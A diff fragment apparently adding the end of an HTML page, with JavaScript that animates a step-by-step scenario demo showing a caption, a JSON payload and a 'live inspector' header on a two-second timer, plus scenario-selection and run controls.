+    $(P+'Cap').textContent=st.cap;
+    $(P+'Pay').textContent=st.pay?JSON.stringify(st.pay,null,2):'';
+    $(P+'Hdr').innerHTML='<span class="ht">live inspector</span>'+st.ins;
+  }
+  function run(){
+    if(running)return; running=true; clearT(); reset();
+    document.querySelectorAll('#'+P+'Seg button').forEach(b=>b.disabled=true); $(P+'Run').disabled=true;
+    $(P+'Pill').textContent='running…';
+    const s=SCEN[scen]; let i=0;
+    (function tick(){
+      if(i>=s.steps.length){ const r=$(P+'Res'); r.className='rt-result show '+(s.result.cls||'ok'); r.textContent=s.result.text; running=false; document.querySelectorAll('#'+P+'Seg button').forEach(b=>b.disabled=false); $(P+'Run').disabled=false; $(P+'Pill').textContent='done'; return; }
+      applyStep(s.steps,i); i++; timers.push(setTimeout(tick,2000));
+    })();
+  }
+  document.querySelectorAll('#'+P+'Seg button').forEach(b=>b.onclick=()=>{ if(running)return; scen=b.dataset.s; document.querySelectorAll('#'+P+'Seg button').forEach(x=>x.classList.toggle('on',x===b)); reset(); });
+  $(P+'Run').onclick=run;
+  reset();
+})();
+</script>
+<script src="devhub-notebook.js"></script>
+</body>
+</html>
